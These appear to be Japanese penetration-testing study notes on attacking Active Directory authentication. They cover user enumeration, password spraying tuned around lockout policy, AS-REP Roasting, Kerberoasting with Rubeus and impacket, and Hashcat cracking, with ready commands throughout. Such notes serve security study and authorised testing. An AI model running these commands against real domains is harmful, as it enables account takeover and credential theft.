- 関連ノート：
	- [ADの基本](ADの基本.md#認証方法)
	- [Password Attack](../../Common/Password%20Attack.md)
	- [🥝Mimikatz](../../../Tools/🥝Mimikatz.md)

---

# Password Spray

## 1. ユーザーの列挙

### (a)ドメインユーザーの足場がある場合

[⭐️PowerViewによるユーザー・グループの列挙列挙](🔍AD%20Enumeration.md#⭐️PowerViewによるユーザー・グループの列挙列挙)

### (b)足場がない場合

kerberosが有効(UDP 88 open)であれば、攻撃者のマシンから🔗[Kerbrute](https://github.com/ropnop/kerbrute/releases)でユーザーの列挙
```zsh
# wordlistは、/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt が良い
kerbrute userenum --dc <DC_IP> -d <domain> <wordlist>
```

SMBが有効(TCP 445 open)であれば、攻撃者のマシンからNetExecでユーザーの列挙（guestが有効である必要あり）：
	[アカウントの列挙](../../Ports%20-%20Service/139,445%20-NetBIOS,%20SMB.md#アカウントの列挙)

## 2. アカウントロックポリシーの確認

>[!NOTE]
>ドメインユーザーの足場がないと確認はできない

- GPOが適用されているため、ドメインユーザー全体共通のポリシーだと思っていい
```powershell
net accounts
```
	↓
```powershell
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          42
Minimum password length:                              7
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        WORKSTATION
```
- 上記例では、５回以上の認証施行でロックがかかり、30分は解除できない
	- 言い換えると、４回までは連続してログイン試行ができ、30分経過すれば再度４回連続の試行が可能

## 3. パスワードスプレーの実行

- 複数アカウントで==パスワードの使い回し==をしていたり、特定の認証情報が有効かどうかをチェックする
- パスワードハッシュでもスプレー可能
- **新たな認証情報を入手したら、可能な限り、すべてのドメインユーザーにスプレーする**

### ⭐️(a) NetExecによるパスワードスプレー

- 条件：
	- 使用するネットワークプロトコルがターゲットで有効であること
	- 足場は不要で、リモートから実行可能
- 特徴：
	- ✅特定したユーザーが管理者権限を持っているかどうかがわかる
	- ❌アカウントロックポリシーを無視して実行するため、アカウントロックがかかりやすい

>[!TIP]
> ユーザー名しか情報がないときは、まずはユーザー名をパスワードとしてスプレーしてみる（ユーザー名：ユーザー名、ユーザー名小文字：ユーザー名小文字）

攻撃者のマシンからパスワードスプレー実行
```zsh
# 明示的にドメインを指定する場合は-d <domain>
# -u、-pにそれぞれwordlistを指定可
netexec <network_protocol(e.g.smb|rdp|winrm|ldap)> <TargetSubnet(192.168.xx.0/24)> -u <username> -p <password> --continue-on-success
```
- →"Pwn3d!"と表示されたらadmin権限をもつという意味だが、一般ユーザーの可能性もある

![](../../../Images/Pasted%20image%2020260105104135.png)

$$Using Credentials- NetExec doc$$

- ⚠"STATUS_LOGON_FAILURE"の意味:
    - ログインが失敗した
    - ユーザーが存在しなかった

![](../../../Images/Pasted%20image%2020251129101219.png)

$$rdp,smb,winrmでログイン試行した結果、rdpでPwn3d!と表示されている（実際には一般ユーザ）$$

### (b) Kerbruteによるパスワードスプレー

- 条件：ターゲットでKerberos(UDP 88)が有効
	- 足場は不要でリモートから実行可能
- 特徴：
	- ✅ユーザーごとに１回までの実行のため、アカウントロックがかからない(はず)
	- ✅高速
	- ✅ユーザー名の存在確認に有効
	- ❌単一のIPにしかスプレーできない

```powershell
kerbrute passwordspray --dc <DC_IP> -d <domain> <username wordlist> '<password>'
```

### (c) PowerShellスクリプト（Spray-Passwords.ps1）によるパスワードスプレー

- ドメインユーザー全てに対して、指定したパスワードをスプレーする
- 条件：ドメインユーザーの侵害(足場)
- 特徴：
	- ✅ユーザーごとに１回までの実行のため、アカウントロックがかからない(はず)
	- ❌トラフィックは膨大
	- ❌最終更新が2016年で古い

1. 🔗[Spray-Passwords.ps1](https://github.com/michele-dedonno/MDD-scripts/blob/master/Spray-Passwords.ps1)をターゲット環境に保存

2. 実行
```powershell
powershell -ep bypass

# 単一パスワードのスプレー
.\Spray-Passwords.ps1 -Pass '<password>'

# ワードリスト使用
.\Spray-Passwords.ps1 -File <username_wordlist>
```
- `-Admin`フラグを追加することで、管理者権限を持つユーザーにもスプレー可能

### 補足：エラーリスト

- Network Error→ワードリストのエンコーディングをANSIに変更する（メモ帳で名前をつけて保存機能を使う）

---

# AS-REP Roasting

**AS-REP RoastingとKerberoastingが実行できないかどうか、各AD環境で必ず１回試行する。**

##  AS-REP Roastingの仕組み

- 目的：
	- 事前認証(Pre-Authentication)が無効なユーザーを検索し、そのユーザーになりすましてAS-REQを送信し、レスポンス(AS-REP)のハッシュをキャプチャしてオフラインクラッキングしてユーザーパスワードを入手する

- 背景：
	- Kerberos認証の1stステップであるAS-REQは、デフォルトで事前認証（Pre-Authentication）を必須にしている（[Kerberos認証ステップ](ADの基本.md#Kerberos認証ステップ)）
	- 事前認証が無効なユーザーがいれば、攻撃者はそのユーザーになりすまし、DCに対してAS-REQを送信できる
	- 事前認証が無効なユーザーを検索するために、認証情報が必要な場合がある（ユーザーAの認証情報でログインし、DCに対し事前認証が無効なユーザー（A以外）を問い合わせ、AS-REQする）

## AS-REP Roasting w/ Rubeus（ローカル実行）

- ドメインユーザーを侵害していて、RDP、SSH、もしくはPowerShell Remoting接続できている場合にWindowsmマシン上から実行

1. Rubeusをダウンロードし、ターゲットマシンに転送する
	- 🔗[Compiled Binaries Rubeus.exe - GitHub](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)
	- [ファイルの転送](../../Common/ファイル操作、ユーティリティ.md#ファイルの転送)

2. AS-REP Roastingの実行
```powershell
.\Rubeus.exe asreproast /nowrap /outfile:<outputfile>
```

3. [🐈‍⬛Hashcat](../../../Tools/🐈‍⬛Password%20Crack%20-%20JtR・Hashcat.md#🐈‍⬛Hashcat)でクラック（モード：18200）

## AS-REP Roasting w/ impacket（リモート実行）

- 内部へRDPもしくはSSH接続できていないときに攻撃者のマシンから実行
- ❌FWなどの影響で失敗することがあるため、認証情報がわかっているならRubeusを使う
- 他攻撃手法：[💥AS-REPRoasting](../../Ports%20-%20Service/389,636,3268%20-%20LDAP.md#💥AS-REPRoasting)

1. AS-REP Roastingの実行
```zsh
impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile <outputfile> <domain>/<username>

# 認証情報が何もないときに複数ユーザーに対して実行
impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile <outputfile> <domain>/ -usersfile <wordlist> -no-pass
```

2. [Hashcat](../../../Tools/🐈‍⬛Password%20Crack%20-%20JtR・Hashcat.md#🐈‍⬛Hashcat)でクラック（モード：18200）

- DCのIPが異なる場合や、認証情報に誤りがある場合、もしくは事前認証が有効な場合は、次のErrorが表示
```
[-] User <username> doesn't have UF_DONT_REQUIRE_PREAUTH set
```

---

# Kerberoasting

##  Kerberoastingの仕組み

- 目的：
	- TGS-REPからサービスアカウントのパスワードハッシュを抽出し、オフラインでクラックすることで、サービスアカウントのパスワードを入手する

- 背景：
	- TGS-REQではSPNを指定してTGSを要求するが、この時点でサービスへのアクセス権限は検証されないため、SPNさえ知っていればTGSを要求できる
	- TGSはサービスアカウントのパスワードハッシュで暗号化されている（[Kerberos認証ステップ](ADの基本.md#Kerberos認証ステップ)のステップ3, 4）

- 使用に適したシチュエーション：
	- アカウントの種別（objectClass / samAccountType / sAMAccountName）が、userオブジェクトのコンテキストでサービスが動作しているときに非常に有効
	- ADのユーザーに`iis_service`など、**サービス用のユーザー**が存在するとき

- 一方で、以下のコンテキストで動作している場合は、パスワードがランダムかつ120文字以上であるため、実質解析は不可能
	- computer
	- krbtgt
	- msDS-ManagedServiceAccount
	- msDS-GroupManagedServiceAccount

>[!TIP]
>侵害したユーザーが、ターゲットオブジェクトに対して`GenericAll`、`GenericWrite`、`WriteProperty`、または`Validated-SPN`を持つ場合は、[Targeted Kerberoast](💥AD%20Exploit.md#Targeted%20Kerberoast)が可能

## Kerberoasting w/ Rubeus

- 前提：対象のマシンにRDP、SSH、もしくはPowerShell Remotingでアクセスしている

1. kerberoast実行
```zsh
.\Rubeus.exe kerberoast /nowrap /outfile:<outputfile>
```

2. [Hashcat](../../../Tools/🐈‍⬛Password%20Crack%20-%20JtR・Hashcat.md#🐈‍⬛Hashcat)でクラック（モード：13100）

## Kerberoasting w/ Impacket

- ✅リモートから実行可能
- ❌Impacketだけではアカウントの種別がユーザーかそれ以外かがわからず、[Kerberoastingの仕組み](#Kerberoastingの仕組み)の「使用に適したシチュエーション」であるかどうかが判別つかない
- ❌FWなどの影響で失敗することがある
	- →**可能な限りRubeusを使用**

- 他攻撃手法：[💥Kerberoasting](../../Ports%20-%20Service/389,636,3268%20-%20LDAP.md#💥Kerberoasting)

1. kerberoast実行
```zsh
impacket-GetUserSPNs -dc-ip <DC_IP> '<domain>/<username>' -request -outputfile <outputfile>
```

2. [Hashcat](../../../Tools/🐈‍⬛Password%20Crack%20-%20JtR・Hashcat.md#🐈‍⬛Hashcat)でクラック（モード：13100）

- Error : "KRB_AP_ERR_SKEW(Clock skew too great)"と表示された場合は、攻撃者のマシンとDCの時刻を同期する必要がある
```zsh
# 時刻同期を止める
sudo timedatactl set-ntp false
# 時刻同期のために使えるポートを列挙する
sudo nmap -sU -p 123,37 <DC_IP>
# (a)UDP 123がopenの場合
ntpdate -u <DC_IP>
# (b)UDP 37がopenの場合
rdate -s <DC_IP>
# 時刻同期を再開する
sudo timedatactl set-ntp true
```

---

# Silver Ticket

[Silver Ticket](../../../Tools/🥝Mimikatz.md#Silver%20Ticket)

---

# Misc

## Skelton Key(バックドア)

[Skeleton Key（バックドア）](../../../Tools/🥝Mimikatz.md#Skeleton%20Key（バックドア）)

## Rubeusの他の使い方

```powershell
# パスワードスプレーをしTGTを入手
Rubeus.exe brute /password:<password> /noticket
# クライアントとKDC間でやり取りされているTGTのキャプチャ
Rubeus.exe harvest /interval:30
```

